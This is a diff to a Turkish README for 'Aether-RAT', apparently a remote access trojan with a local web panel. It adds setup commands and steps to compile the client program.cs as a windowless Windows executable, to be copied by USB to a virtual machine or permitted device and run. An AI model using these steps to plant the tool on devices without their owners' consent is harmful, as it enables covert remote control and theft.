@@ -48,6 +48,12 @@ Test süreçleri | Planlanıyor
 git clone https://github.com/drhakoo-beep/Aether-RAT
 
 cd Aether-RAT
+
+python -m venv venv
+
+source venv/bin/activate
+
+pip install fastapi uvicorn jinja2 --break-system-packages
 ```
 
 Daha sonra
@@ -66,9 +72,26 @@ python main.py
 
 Şimdi tarayıcınızdan localhost:8080 adresine gidiniz.
 
-Panel açıldıktan sonra, program.cs dosyanızı .exe formatında derleyiniz.
+Panel açıldıktan sonra, program.cs dosyanızı .exe formatında derleyiniz. 
 
-Derlendikten sonra sanal makinanıza veya izinli olduğunuz cihazlara flaşbellek vb. yöntemlerle indirin ve .exe programına çift tıklayın ve artık hazırsınız.
+
+(Windows) içinde derleme komutu;
+
+```bash
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:winexe /r:System.Drawing.dll,System.Windows.Forms.dll program.cs
+```
+
+(Linux) içinde derleme komutu;
+
+```bash
+sudo apt install mono-complete -y
+
+cd /dosyanin/oldugu/dizin
+
+mcs -target:winexe -r:System.Drawing.dll,System.Windows.Forms.dll program.cs
+```
+
+Derlendikten sonra sanal makinanıza veya izinli olduğunuz cihazlara flaşbellek vb. yöntemlerle indirin, .exe programına çift tıklayın ve artık hazırsınız.
 
 Panelde sayfayı yenileyin ve cihaz isminin göründüğünü görebilirsiniz, üstüne tıklayın.
 
